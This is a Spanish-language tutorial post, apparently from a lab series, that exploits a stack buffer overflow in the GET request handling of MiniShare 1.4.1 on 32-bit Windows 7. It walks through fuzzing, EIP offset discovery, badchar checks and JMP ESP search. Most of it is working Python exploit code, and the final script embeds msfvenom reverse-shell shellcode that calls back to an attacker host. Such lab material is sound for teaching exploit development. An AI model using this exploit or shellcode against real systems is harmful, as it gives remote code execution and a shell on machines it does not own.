---
title: "Buffer Overflow: MiniShare"
date: 2023-12-25
categories: [Buffer Overflow]
tags: [buffer overflow, immunity debugger, windows 32-bits, python, shellcode]
image:
    path: /assets/thumbnail/bufferoverflow.png
---


# Introducción
MiniShare es una **aplicación ultra rápida y veloz para compartir archivos** que permite a los usuarios transferir contenido sin problemas entre los dispositivos.

- Links de descarga:
        
    - **MiniShare v1.4.1**: [https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/](https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/)
    - **Windows 7 Versión de 32 bits**: [https://windows-7-home-premium.uptodown.com/windows/descargar/68635486](https://windows-7-home-premium.uptodown.com/windows/descargar/68635486)



## Escenario

En este lab se explotará un BoF en el programa MiniShare de versión 1.4.1, este programa habrá que descargarlo en una máquina Windows 7 x86.



Este programa abre un servicio por el puerto 80 y para acceder a este se podría crear una conexión por telnet para enviar una petición GET.

```bash
telnet <IPWindows> <Puerto>
GET / HTTP/1.1
<PreesEnter>
<PressEnter>
```

Al hacer un reconocimiento rápido se puede ver el servicio que está corriendo en el puerto 80 junto con su versión:

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled.png)

## Buffer Overflow

Esta versión es vulnerable a Buffer Overflow en el parámetro GET. Para probar esto, se creará un script que haga una petición por GET  con cierta cantidad de caracteres de forma progresiva hasta que se acontezca un error, esto con el objetivo de ver cuántos caracteres se necesitan para acontecer el error.

Además se usará el Immunity Debugger para analizar cómo se comporta el programa.

```bash
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_add = "192.168.0.104"
port = 80

def exploit ():

    total_length = 100

    while True:
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(7)
            c.connect((ip_add, port))

            print("[+] Enviando %d bytes" % total_length)
            c.send(b"GET " + b"A"*total_length + b" HTTP/1.1\r\n\r\n")
            c.recv(1024)
            c.close()

            total_length += 100
                    
        except:
            print("[+] El programa ha crasheado en %d bytes" % total_length)
            sys.exit(1)

if __name__ == '__main__':
    exploit()
```

Como se puede ver, el programa crasheó al enviarse 1800 “As” y al verificar el Immunity debugger, se puede ver que se sobrescribió el registro EIP:

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 1.png)

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 2.png)

## Tomando el control de EIP

Una vez acontecido el BoF, ahora se tomará el control del EIP, para esto hay que descubrir cuántos bytes de deben enviar antes de sobrescribir el EIP, primero se debe crear una cadena de caracteres con patrón con la herramienta “pattern_create” de metasploit:

```bash
/usr/hsare/metasploit-framework/tools/exploit/pattern_create.rb -l 1800
```

Esto dará una cadena de caracteres que se ingresará como payload en el script:

```bash
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_add = "192.168.0.104"
port = 80

pattern = b"<patrón con 1800 caracteres>"

def exploit ():

    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(7)
        c.connect((ip_add, port))

        c.send(b"GET " + pattern + b" HTTP/1.1\r\n\r\n")
        c.recv(1024)
        c.close()
                
    except:
        print("[+] El programa ha concluido")
        sys.exit(1)

if __name__ == '__main__':
    exploit()
```

Al ejecutar el script se enviará esta cadena de caracteres y ahora se puede ver el valor de EIP en el Immunity Debugger.

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 3.png)

Ahora para descubrir el offset o junk que hay que ingresar antes de sobrescribir el EIP, se usa la herramienta “pattern_offset” de metasploit:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset -q 0x36684335
```

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 4.png)

Esto significa que hay que ingresar 1787 caracteres para que los siguientes caracteres que se ingresen, sobrescriban el EIP. Esto se puede representar en el script de la siguiente manera:

```bash
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_add = "192.168.0.104"
port = 80
offset= 1787

before_eip = b"A"*offset
eip = b"B"*4

def exploit ():

    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(7)
        c.connect((ip_add, port))

        c.send(b"GET " + before_eip + eip + b" HTTP/1.1\r\n\r\n")
        c.recv(1024)
        c.close()
                
    except:
        print("[+] El programa ha concluido")
        sys.exit(1)

if __name__ == '__main__':
    exploit()
```

## Crear el bytearray y detectar badchars

Una vez tomado el control del EIP, se creará una cadena de bytes o un bytearray para ver qué bytes no se interpretan en el stack y detectar badchars, para hacer esto se utilizará la heramienta mona del Immunity Debugger.

```bash
# Crear directorio de trabajo
!mona config -set workingfolder C:\Users\bryan\Desktop\Analysis

# Generar el bytearray
!mona bytearray -cpb '\x00'

-cpb # Indica que bytes excluir en el nuevo byetarray generado
```

Esto generará un archivo llamado “bytearray” en el directorio “Analysis” con el bytearray generado.

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 5.png)

Este archivo se pasará a la máquina local por medio de SMB:

```bash
# En la máquina del atacante:
impacket-smbserver smbFolder $(pwd) -smb2support
```

Con el SaMBa corriendo, ahora se puede copiar el archivo “bytearray.txt” en el directorio compartido:

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 6.png)

Ahora la idea es enviar el bytearray para sobrescribir el ESP para detectar bytes que no se estén interpretando, estos bytes serán badchars por lo que será necesario crear un nuevo bytearray excluyendo estos badchars y en el script añadir este nuevo bytearray y repetir el proceso hasta que no hayan más. La detección de badchars se puede hacer utilizando mona:

```bash
!mona compare -a 0x<ESPAddress> -f \Users\bryan\Desktop\Analysis\bytearray.bin
```

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 7.png)

El script quedará de la siguiente manera:

```bash
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_add = "192.168.0.104"
port = 80
offset= 1787

before_eip = b"A"*offset
eip = b"B"*4
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

def exploit ():

    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(7)
        c.connect((ip_add, port))

        c.send(b"GET " + before_eip + eip + after_eip + b" HTTP/1.1\r\n\r\n")
        c.recv(1024)
        c.close()
                
    except:
        print("[+] El programa ha concluido")
        sys.exit(1)

if __name__ == '__main__':
    exploit()
```

## Encontrar dirección de OPCode con JMP ESP

Una vez eliminados todos los badchars, la idea es que de primeras el EIP no puede apuntar directamente al ESP por lo que deberá apuntar a un OPCode que aplique como instrucción un JMP al ESP.

Para esto, hay que tener en cuenta el OPCode del JMP al ESP, esto se puede obtener con la herramienta “nasm_shell” de metasploit:

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

# En el nasm ingresar: JMP ESP
```

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 8.png)

Una vez obtenido el OPCode de JMP ESP, ahora hay que buscar algún módulo que contenga esta instrucción para poder obtener su dirección y apuntar a él en el EIP.

Para encontrar un módulo que sirva para esta tarea, se se utilizará el siguiente comando de mona, en este caso se buscan módulos que tengan las primeras 4 protecciones deshabilitadas (”Rebase”, “SafeSEH”, “ASL” y “NXCompat”):

```bash
!mona modules
```

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 9.png)

En este caso el único módulo que cumple con las condiciones es el “minishare.exe”.

Ahora se aplicará un find en este ejecutable para encontrar un OPCode que como instrucción aplique un JMP ESP.

```bash
!mona find -s "\xFF\xE4" -m minishare.exe
```

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 10.png)

Como se puede ver, no se encontró ningún OPCode que ña instrucción “JMP ESP”.

En este caso se utilizará otro comando para buscar este OPCode:

```bash
!mona findwild -s "JMP ESP"
```

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 11.png)

Como se puede ver, se encontraron muchos resultados, ahora se debe tomar una dirección pero que no contenga los badchars encontrados anteriormente (”x00” y “x0d”).

## Verificación con breakpoints

Para este ejemplo se tomará la dirección “0x7657abcb”. La tarea ahora es hacer que el EIP apunte a esta dirección de OPCode y esto verificarlo con Immunity Debugger utilizando breakpoints.

Primero se debe representar esto en el script y se debe tomar en cuenta que las direcciones en memoria deben representarse con formato “little endian” en algunas arquitecturas, este es el caso por lo que se importará la librería “pack” para realizar esto:

```bash
#!/usr/bin/python3

import socket
import sys
from struct import pack

# Variables globales
ip_add = "192.168.0.104"
port = 80
offset= 1787

before_eip = b"A"*offset
eip = pack("<L", 0x7657abcb)
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

def exploit ():

    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(7)
        c.connect((ip_add, port))

        c.send(b"GET " + before_eip + eip + after_eip + b" HTTP/1.1\r\n\r\n")
        c.recv(1024)
        c.close()
                
    except:
        print("[+] El programa ha concluido")
        sys.exit(1)

if __name__ == '__main__':
    exploit()
```

Con el script listo, se buscará la sección de memoria que contiene el OPCode con la instruccón “JMP ESP”, para hacer la búsqueda, hay que dar click en la flecha apuntando a la derecha e ingresar la dirección del OPCode:

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 12.png)

Ahora se debe crear el breakpoint en esta sección:

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 13.png)

Una vez hecho, dar click en “Play” y ejecutar el script. De esta forma ahora el flujo del programa parará en esa sección de memoria y se podrá ver que el EIP está apuntando al OPCode.

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 14.png)

Y si se da un “step into”, se podrá ver que este saltará al ESP.

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 15.png)

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 16.png)

## Creación del shellcode y NOPs

Una vez hecho lo anterior ahora queda crear el shellcode que usara para obtener una reverse shell y la asignación de NOP para que el shellcode sea interpretado y ejecutado correctamente.

Para crear el shellcode, se usará msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp 
--platform windows -a x86 LHOST=192.168.0.100 LPORT=4646
-b '\x00\x0d' -f c EXITFUNC=thread

-p # Indica el tipo de payload, se ingresa el SO y 
# cómo se proporcionará la shell.

--platform <OS> -a <x64/x86> # Indica la plataforma a la 
# que será insertado el payload y la arquitectura si es 
# 64 o 32 bits.

LHOST= # Indica que se enviará una reverse shell a una 
# dirección IP.
LPORT= # Indica el puerto por el cual se recibirá la 
# reverse shell

-f # Indica el formato que tomará el shellcode

-b # Indica los badchars a eliminar en el shellcode

EXITFUNC=thread # Sirve para crear un subproceso por el 
# cual se colgará la sesión con la máquina víctima.
# Sin esto, al terminar la sesión en la víctima, el 
# proceso crasheará y el servicio ya no estará disponible
```

Ahora se debe agregar este shellcode en el script, además se le deben agregar los NOPs para que el programa sea interpretado correctamente. La representación del NOP dependerá de la arquitectura de la máquina, en este caso, para arquitecturas x86 normalmente se usa “\x90” para representar el NOP y en este caso se agregarán 16 NOPs.

El script final se verá de la siguiente manera:

```bash
#!/usr/bin/python3

import socket
import sys
from struct import pack

# Variables globales
ip_add = "192.168.0.104"
port = 80
offset= 1787

before_eip = b"A"*offset
eip = pack("<L", 0x7657abcb)
NOP = b"\x90"*16
shellcode = (b"\xba\xbf\xab\xfa\xe1\xda\xcd\xd9\x74\x24\xf4\x5e\x31\xc9"
b"\xb1\x52\x83\xee\xfc\x31\x56\x0e\x03\xe9\xa5\x18\x14\xe9"
b"\x52\x5e\xd7\x11\xa3\x3f\x51\xf4\x92\x7f\x05\x7d\x84\x4f"
b"\x4d\xd3\x29\x3b\x03\xc7\xba\x49\x8c\xe8\x0b\xe7\xea\xc7"
b"\x8c\x54\xce\x46\x0f\xa7\x03\xa8\x2e\x68\x56\xa9\x77\x95"
b"\x9b\xfb\x20\xd1\x0e\xeb\x45\xaf\x92\x80\x16\x21\x93\x75"
b"\xee\x40\xb2\x28\x64\x1b\x14\xcb\xa9\x17\x1d\xd3\xae\x12"
b"\xd7\x68\x04\xe8\xe6\xb8\x54\x11\x44\x85\x58\xe0\x94\xc2"
b"\x5f\x1b\xe3\x3a\x9c\xa6\xf4\xf9\xde\x7c\x70\x19\x78\xf6"
b"\x22\xc5\x78\xdb\xb5\x8e\x77\x90\xb2\xc8\x9b\x27\x16\x63"
b"\xa7\xac\x99\xa3\x21\xf6\xbd\x67\x69\xac\xdc\x3e\xd7\x03"
b"\xe0\x20\xb8\xfc\x44\x2b\x55\xe8\xf4\x76\x32\xdd\x34\x88"
b"\xc2\x49\x4e\xfb\xf0\xd6\xe4\x93\xb8\x9f\x22\x64\xbe\xb5"
b"\x93\xfa\x41\x36\xe4\xd3\x85\x62\xb4\x4b\x2f\x0b\x5f\x8b"
b"\xd0\xde\xf0\xdb\x7e\xb1\xb0\x8b\x3e\x61\x59\xc1\xb0\x5e"
b"\x79\xea\x1a\xf7\x10\x11\xcd\x38\x4c\x19\x69\xd1\x8f\x19"
b"\x63\x07\x19\xff\xe9\x57\x4f\xa8\x85\xce\xca\x22\x37\x0e"
b"\xc1\x4f\x77\x84\xe6\xb0\x36\x6d\x82\xa2\xaf\x9d\xd9\x98"
b"\x66\xa1\xf7\xb4\xe5\x30\x9c\x44\x63\x29\x0b\x13\x24\x9f"
b"\x42\xf1\xd8\x86\xfc\xe7\x20\x5e\xc6\xa3\xfe\xa3\xc9\x2a"
b"\x72\x9f\xed\x3c\x4a\x20\xaa\x68\x02\x77\x64\xc6\xe4\x21"
b"\xc6\xb0\xbe\x9e\x80\x54\x46\xed\x12\x22\x47\x38\xe5\xca"
b"\xf6\x95\xb0\xf5\x37\x72\x35\x8e\x25\xe2\xba\x45\xee\x02"
b"\x59\x4f\x1b\xab\xc4\x1a\xa6\xb6\xf6\xf1\xe5\xce\x74\xf3"
b"\x95\x34\x64\x76\x93\x71\x22\x6b\xe9\xea\xc7\x8b\x5e\x0a"
b"\xc2")

def exploit ():

    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip_add, port))

        c.send(b"GET " + before_eip + eip + NOP + shellcode + b" HTTP/1.1\r\n\r\n")
        c.recv(1024)
        c.close()
                
    except:
        print("[+] El programa ha concluido")
        sys.exit(1)

if __name__ == '__main__':
    exploit()
```

![Untitled](/assets/Buffer-Overflow/Lab2/Untitled 17.png)
